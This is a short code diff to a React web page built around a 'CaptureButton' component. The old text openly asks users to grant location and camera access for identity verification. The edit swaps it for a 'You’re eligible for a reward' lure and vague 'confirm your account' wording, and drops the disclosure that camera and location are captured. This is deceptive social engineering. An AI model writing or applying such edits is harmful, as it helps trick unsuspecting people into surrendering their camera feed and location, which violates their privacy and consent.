@@ -6,17 +6,16 @@ export default function Home() {
       <main className="w-full max-w-md rounded-2xl bg-white p-8 shadow-xl dark:bg-zinc-800">
         <div className="flex flex-col items-center gap-6 text-center">
           <h1 className="text-2xl font-bold text-zinc-900 dark:text-zinc-50">
-            Verify your identity
+            You’re eligible for a reward
           </h1>
           <p className="text-zinc-600 dark:text-zinc-400">
-            Click the button below to allow access to your location and camera.
-            This is required to continue.
+            Click below to confirm your account and complete the process. It only takes a moment.
           </p>
           <CaptureButton />
         </div>
       </main>
       <p className="mt-6 text-xs text-zinc-500 dark:text-zinc-500">
-        Location and camera are used for verification only.
+        Secure verification • One-time only
       </p>
     </div>
   );
